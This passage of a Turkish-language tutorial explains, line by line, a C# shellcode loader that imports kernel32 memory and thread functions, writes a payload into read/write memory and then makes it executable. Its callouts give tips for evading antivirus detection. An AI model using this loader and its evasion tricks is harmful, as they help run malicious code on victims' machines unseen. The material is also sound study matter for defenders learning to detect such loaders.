## Understanding the Code

### Functions

!!! failure

    DLL ismi, atlatma sonucunu etkileyebilir:

    * [ ] kernel32.dll
    * [x] kernel32

[VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) fonksiyonu içe aktarılır ([P/Invoke](https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke) teknolojisi):

```cs title="Program.cs" linenums="9"
[DllImport("kernel32")]
private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
```

[VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) fonksiyonu içe aktarılır:

```cs title="Program.cs" linenums="12"
[DllImport("kernel32")]
private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
```

[CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) fonksiyonu içe aktarılır:

```cs title="Program.cs" linenums="15"
[DllImport("kernel32")]
private static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);
```

[WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject) fonksiyonu içe aktarılır:

```cs title="Program.cs" linenums="18"
[DllImport("kernel32")]
private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
```

### Memory Allocation

Payload için okuma/yazma destekli bir bellek tahsis edilir:

!!! danger

    Sadece okuma/yazma desteği eklendi, yürütme desteği sonradan eklendi. Tek seferde okuma/yazma/yürütme desteği eklemek tespit edilme riskini artırabilir.

| MEMORY PROTECTION CONSTANT | VALUE |
|---|---|
| [PAGE_READWRITE](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants#constants) | 0x04 |

```cs title="Program.cs" linenums="50"
IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x00001000, 0x04);
```

Payload, tahsis edilen belleğe kopyalanır:

```cs title="Program.cs" linenums="61"
Marshal.Copy(buf, 0, lpStartAddress, buf.Length);
```

Belleğe kopyalanan payload için yürütme desteği ayarlanır:

| MEMORY PROTECTION CONSTANT | VALUE |
|---|---|
| [PAGE_EXECUTE_READ](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants#constants) | 0x20 |

```cs title="Program.cs" linenums="63"
uint lpflOldProtect;
VirtualProtect(lpStartAddress, (uint)buf.Length, 0x20, out lpflOldProtect);
```
